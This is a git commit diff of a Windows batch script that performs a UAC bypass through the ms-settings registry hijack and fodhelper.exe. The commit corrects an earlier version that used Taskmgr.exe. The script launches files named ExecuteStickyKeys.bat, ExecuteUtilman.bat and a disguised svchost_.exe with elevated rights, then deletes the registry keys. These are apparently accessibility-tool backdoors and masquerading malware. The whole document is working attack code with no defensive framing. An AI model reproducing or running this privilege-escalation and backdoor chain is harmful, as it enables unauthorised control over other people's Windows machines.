098b2ddd1fdadfacf12626f311a526109ffdbfb6
FooTex16 <hffjhfcvvtugs@yahoo.com>
2025-07-05 22:43:50 +0700

    RunScript.bat

--- RunScript.bat
+++ RunScript.bat
@@ -7,27 +7,27 @@ set "currentDir=%~dp0"
 :: ===========================
 :: Bypass UAC - ExecuteStickyKeys.bat
 :: ===========================
-REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "%currentDir%ExecuteStickyKeys.bat"
+REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "\"%currentDir%ExecuteStickyKeys.bat\""
 REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
-start "" "C:\Windows\System32\Taskmgr.exe"
+start "" "C:\Windows\System32\fodhelper.exe"
 timeout /t 5 >nul
 REG DELETE "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
 
 :: ===========================
 :: Bypass UAC - ExecuteUtilman.bat
 :: ===========================
-REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "%currentDir%ExecuteUtilman.bat"
+REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "\"%currentDir%ExecuteUtilman.bat\""
 REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
-start "" "C:\Windows\System32\Taskmgr.exe"
+start "" "C:\Windows\System32\fodhelper.exe"
 timeout /t 5 >nul
 REG DELETE "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
 
 :: ===========================
 :: Bypass UAC - svchost_.exe
 :: ===========================
-REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "%currentDir%svchost_.exe"
+REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "\"%currentDir%svchost_.exe\""
 REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""
-start "" "C:\Windows\System32\Taskmgr.exe"
+start "" "C:\Windows\System32\fodhelper.exe"
 timeout /t 5 >nul
 REG DELETE "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
 
@@ -40,4 +40,4 @@ taskkill /f /im powershell.exe >nul 2>&1
 :: ===========================
 :: Tampilkan Home Screen (Windows + D)
 :: ===========================
-powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESC}'); Start-Sleep -Milliseconds 200; $wshell.SendKeys('^%{d}')"
+powershell -command "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESC}'); Start-Sleep -Milliseconds 200; $wshell.SendKeys('^{d}')"
